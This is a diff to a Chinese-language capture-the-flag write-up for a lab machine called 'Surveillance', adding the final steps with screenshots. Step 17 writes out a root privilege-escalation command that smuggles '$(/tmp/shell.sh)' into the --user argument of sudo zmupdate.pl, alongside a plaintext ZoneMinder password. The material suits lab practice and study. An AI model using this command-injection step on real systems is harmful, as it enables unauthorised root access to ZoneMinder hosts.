@@ -1,4 +1,4 @@
-Surveillance Level:Medium
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/73de9b35-33f4-4b06-8a5b-398ba7f411f7)Surveillance Level:Medium
 ===
 尋找user.txt
 ---
@@ -73,4 +73,15 @@ Surveillance Level:Medium
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/4ae26ac4-8f87-45b0-8698-5c7e199573a5)
 
-       16.
+       16.使用shell.sh 
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/bc8d2bbf-c859-4747-9ba7-acdb584f1547)
+
+       17.執行sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/shell.sh)' --pass=ZoneMinderPassword2023 取得root權限
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9d82a9dd-a621-4e34-a70b-9492f50df2c6)
+
+       18.尋找root.txt
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/266e13f8-f438-4b0f-bdc7-12362c124aff)
+
